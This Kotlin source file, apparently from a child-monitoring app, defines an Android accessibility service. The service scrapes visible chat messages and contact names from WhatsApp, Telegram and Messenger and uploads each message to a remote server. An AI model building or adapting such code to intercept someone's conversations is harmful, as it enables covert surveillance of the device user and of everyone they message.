package com.monitor.child

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.Collections

/**
 * Reads messages from the screen when a chat is open in a supported messaging app, using the
 * Accessibility API. Captures both sides of a conversation as it is viewed/scrolled — more than
 * notifications, but only what is actually on screen (not archived or unopened chats).
 *
 * This depends on each app's on-screen layout (view ids), so it is best-effort and may need tuning
 * per app version. Reported as `message` events with source "chat".
 */
class ChatReaderService : AccessibilityService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private lateinit var store: Store

    // Bounded LRU of recently reported message fingerprints, to avoid re-sending the same visible
    // messages on every scroll/update.
    private val recent: MutableSet<String> = Collections.newSetFromMap(
        object : LinkedHashMap<String, Boolean>(512, 0.75f, true) {
            override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Boolean>?): Boolean =
                size > 500
        },
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        store = Store(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in MESSAGING_APPS) return
        val token = store.deviceToken ?: return

        val root = rootInActiveWindow ?: return
        val chatName = extractTitle(root, pkg)
        val texts = ArrayList<String>()
        collectMessageTexts(root, texts)
        root.recycle()
        if (texts.isEmpty()) return

        val fresh = ArrayList<String>()
        synchronized(recent) {
            for (t in texts) {
                if (recent.add("$pkg|$chatName|$t")) fresh.add(t)
            }
        }
        if (fresh.isEmpty()) return

        val baseUrl = store.baseUrl
        scope.launch {
            val api = Api(baseUrl)
            for (t in fresh) {
                api.postMessage(token, pkg, chatName, t, Instant.now().toString(), source = "chat")
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    private fun extractTitle(root: AccessibilityNodeInfo, pkg: String): String? {
        for (id in TITLE_IDS) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id) ?: continue
            var title: String? = null
            for (n in nodes) {
                if (title == null) {
                    val t = n.text?.toString()
                    if (!t.isNullOrBlank()) title = t
                }
                n.recycle()
            }
            if (title != null) return title
        }
        return null
    }

    private fun collectMessageTexts(node: AccessibilityNodeInfo?, out: MutableList<String>) {
        if (node == null) return
        val id = node.viewIdResourceName
        if (id != null && MESSAGE_TEXT_IDS.any { id.endsWith(it) }) {
            val t = node.text?.toString()
            if (!t.isNullOrBlank()) out.add(t)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            collectMessageTexts(child, out)
            child?.recycle()
        }
    }

    companion object {
        private val MESSAGING_APPS = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "org.telegram.messenger",
            "com.facebook.orca",
        )
        // On-screen message bubble text view ids (best-effort, app-version dependent).
        private val MESSAGE_TEXT_IDS = listOf(":id/message_text", ":id/text_content", ":id/message")
        // Chat title (contact/group name) view ids.
        private val TITLE_IDS = listOf(
            "com.whatsapp:id/conversation_contact_name",
            "org.telegram.messenger:id/action_bar_title",
        )
    }
}
